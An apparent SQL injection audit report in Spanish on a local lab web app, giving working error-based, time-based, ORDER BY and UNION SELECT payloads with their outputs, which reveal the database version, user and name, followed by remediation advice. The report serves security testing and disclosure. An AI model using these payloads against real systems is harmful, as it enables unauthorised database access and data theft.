# Informe de auditoria SQLi

- Objetivo: `http://web.dev.local:8083`
- Fecha de analisis: `2026-04-24T05:39:54Z`
- Alcance: identificacion y confirmacion de SQL injection en la aplicacion web expuesta

## Resumen ejecutivo

Se confirmo una vulnerabilidad de **SQL injection** en el parametro `id` del endpoint `GET /index.php` cuando se envia tambien `Submit=Submit`.

La vulnerabilidad es explotable mediante tecnicas **error-based**, **boolean/logic-based**, **time-based blind** y **UNION-based**. La aplicacion expone errores de MariaDB/PHP en produccion, lo que facilita la explotacion.

## Superficie identificada

- Endpoint principal: `GET /index.php`
- Parametro vulnerable: `id`
- Parametro auxiliar observado: `Submit=Submit`
- Stack observado por cabeceras/errores: `Apache/2.4.65`, `PHP/8.1.33`, `MariaDB 10.11.14`

## Evidencias

### 1. Error-based SQLi

Payload:

```text
/index.php?id=1'&Submit=Submit
```

Resultado observado:

```text
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax ... near ''1''
```

Ademas, un payload con extraccion por error devolvio la version del motor:

```text
/index.php?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -&Submit=Submit
```

Respuesta:

```text
XPATH syntax error: '~10.11.14-MariaDB-ubu2204~'
```

### 2. Time-based blind SQLi

Payload:

```text
/index.php?id=1' AND SLEEP(3)-- -&Submit=Submit
```

Resultado observado:

- La respuesta tardo ~3.01 s
- Confirmacion de evaluacion directa de expresiones SQL controladas por el atacante

### 3. UNION-based SQLi

Se determino que la consulta original tiene **2 columnas**:

```text
/index.php?id=1' ORDER BY 2-- -&Submit=Submit   -> OK
/index.php?id=1' ORDER BY 3-- -&Submit=Submit   -> Unknown column '3' in 'ORDER BY'
```

Confirmacion de `UNION SELECT` con dos columnas:

```text
/index.php?id=-1' UNION SELECT 'AAA','BBB'-- -&Submit=Submit
```

Respuesta renderizada:

```text
First name: AAA
Surname: BBB
```

Extraccion minima de informacion sensible del backend:

```text
/index.php?id=-1' UNION SELECT CONCAT('VER:',VERSION()),USER()-- -&Submit=Submit
```

Respuesta renderizada:

```text
First name: VER:10.11.14-MariaDB-ubu2204
Surname: root@172.18.0.3
```

Y tambien:

```text
/index.php?id=-1' UNION SELECT DATABASE(),@@version-- -&Submit=Submit
```

Respuesta renderizada:

```text
First name: sqli_demo
Surname: 10.11.14-MariaDB-ubu2204
```

## Impacto

Un atacante podria:

- Alterar la logica de las consultas
- Enumerar esquema y metadatos de la base de datos
- Exfiltrar datos arbitrarios accesibles por el usuario SQL
- Usar tecnicas ciegas o por errores incluso si la salida cambia

La exposicion de errores internos revela ademas rutas locales como `/var/www/html/low.php` e `index.php`, lo que incrementa el riesgo.

## Conclusiones

- Vulnerabilidad encontrada: **si**
- Explotacion confirmada: **si**
- Severidad estimada: **alta**

## Recomendaciones

1. Sustituir concatenacion SQL por consultas preparadas (`prepared statements`) con parametros.
2. Validar `id` estrictamente como entero antes de consultar.
3. Desactivar la exposicion de errores detallados en produccion.
4. Aplicar principio de minimo privilegio al usuario de base de datos; no usar `root`.
5. Registrar y monitorizar patrones de payload SQLi.
